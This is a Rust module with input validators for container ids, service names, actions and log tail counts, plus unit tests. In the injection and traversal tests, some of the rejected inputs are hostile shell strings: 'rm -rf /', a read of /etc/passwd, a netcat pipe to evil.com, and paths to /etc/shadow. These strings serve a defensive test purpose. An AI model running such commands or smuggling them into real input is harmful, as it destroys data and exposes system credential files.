
#[derive(Debug, Clone, PartialEq)]
pub enum ValidationError {
    InvalidContainerId(String),
    InvalidAction(String),
    InvalidTailValue(u64),
    EmptyInput,
    TooLong(String),
}

impl std::fmt::Display for ValidationError {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::InvalidContainerId(value) => write!(formatter, "invalid container id or service name: {value}"),
            Self::InvalidAction(value) => write!(formatter, "invalid action: {value}"),
            Self::InvalidTailValue(value) => write!(formatter, "invalid tail value: {value}"),
            Self::EmptyInput => write!(formatter, "input cannot be empty"),
            Self::TooLong(value) => write!(formatter, "input is too long: {value}"),
        }
    }
}

impl std::error::Error for ValidationError {}

pub fn validate_container_id(id: &str) -> Result<(), ValidationError> {
    validate_name(id, 128, true)
}

pub fn validate_action(action: &str) -> Result<&'static str, ValidationError> {
    match action {
        "start" => Ok("start"),
        "stop" => Ok("stop"),
        "restart" => Ok("restart"),
        other => Err(ValidationError::InvalidAction(other.to_owned())),
    }
}

pub fn validate_tail(n: u64) -> u64 {
    match n {
        0 => 300,
        1..=10000 => n,
        _ => 10000,
    }
}

pub fn validate_service_name(name: &str) -> Result<(), ValidationError> {
    validate_name(name, 64, false)
}

fn validate_name(value: &str, max_len: usize, allow_dot: bool) -> Result<(), ValidationError> {
    if value.is_empty() {
        return Err(ValidationError::EmptyInput);
    }

    if value.len() > max_len {
        return Err(ValidationError::TooLong(value.to_owned()));
    }

    if value.contains("..") {
        return Err(ValidationError::InvalidContainerId(value.to_owned()));
    }

    let mut chars = value.chars();
    let first = match chars.next() {
        Some(char) => char,
        None => return Err(ValidationError::EmptyInput),
    };

    if !first.is_ascii_alphanumeric() {
        return Err(ValidationError::InvalidContainerId(value.to_owned()));
    }

    if !value.chars().all(|char| is_allowed_name_char(char, allow_dot)) {
        return Err(ValidationError::InvalidContainerId(value.to_owned()));
    }

    Ok(())
}

fn is_allowed_name_char(char: char, allow_dot: bool) -> bool {
    char.is_ascii_alphanumeric() || char == '-' || char == '_' || (allow_dot && char == '.')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_valid_container_ids() {
        let hex_id = "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890";

        for id in ["abc123", "mlearn-backend-1", "mlearn.backend.1", "mlearn_backend_1", hex_id] {
            assert_eq!(validate_container_id(id), Ok(()));
        }
    }

    #[test]
    fn rejects_container_path_traversal() {
        for id in ["../etc/passwd", "/etc/shadow", "..\\windows\\system32"] {
            assert!(matches!(validate_container_id(id), Err(ValidationError::InvalidContainerId(_))));
        }
    }

    #[test]
    fn rejects_container_shell_injection() {
        for id in ["; rm -rf /", "$(cat /etc/passwd)", "| nc evil.com"] {
            assert!(matches!(validate_container_id(id), Err(ValidationError::InvalidContainerId(_))));
        }
    }

    #[test]
    fn rejects_empty_and_long_container_ids() {
        assert_eq!(validate_container_id(""), Err(ValidationError::EmptyInput));
        assert!(matches!(validate_container_id(&"a".repeat(129)), Err(ValidationError::TooLong(_))));
    }

    #[test]
    fn rejects_invalid_container_patterns() {
        for id in [" bad", "bad id", ".bad", "-bad", "_bad", "bad/name", "bad\\name", "bad..name", "bad\0name"] {
            assert!(matches!(validate_container_id(id), Err(ValidationError::InvalidContainerId(_))));
        }
    }

    #[test]
    fn validates_actions() {
        assert_eq!(validate_action("start"), Ok("start"));
        assert_eq!(validate_action("stop"), Ok("stop"));
        assert_eq!(validate_action("restart"), Ok("restart"));

        for action in ["exec", "kill", "rm", "delete", "", "START"] {
            assert!(matches!(validate_action(action), Err(ValidationError::InvalidAction(_))));
        }
    }

    #[test]
    fn clamps_tail_values() {
        assert_eq!(validate_tail(0), 300);
        assert_eq!(validate_tail(1), 1);
        assert_eq!(validate_tail(300), 300);
        assert_eq!(validate_tail(10001), 10000);
        assert_eq!(validate_tail(50000), 10000);
        assert_eq!(validate_tail(50), 50);
    }

    #[test]
    fn validates_service_names() {
        for name in ["backend", "mlearn-backend", "mlearn_backend", "service1"] {
            assert_eq!(validate_service_name(name), Ok(()));
        }

        assert_eq!(validate_service_name(""), Err(ValidationError::EmptyInput));
        assert!(matches!(validate_service_name(&"a".repeat(65)), Err(ValidationError::TooLong(_))));

        for name in [".backend", "-backend", "_backend", "mlearn.backend", "../backend", "/backend", "back end", "backend;rm", "$(backend)", "backend|evil", "backend\0"] {
            assert!(matches!(validate_service_name(name), Err(ValidationError::InvalidContainerId(_))));
        }
    }
}
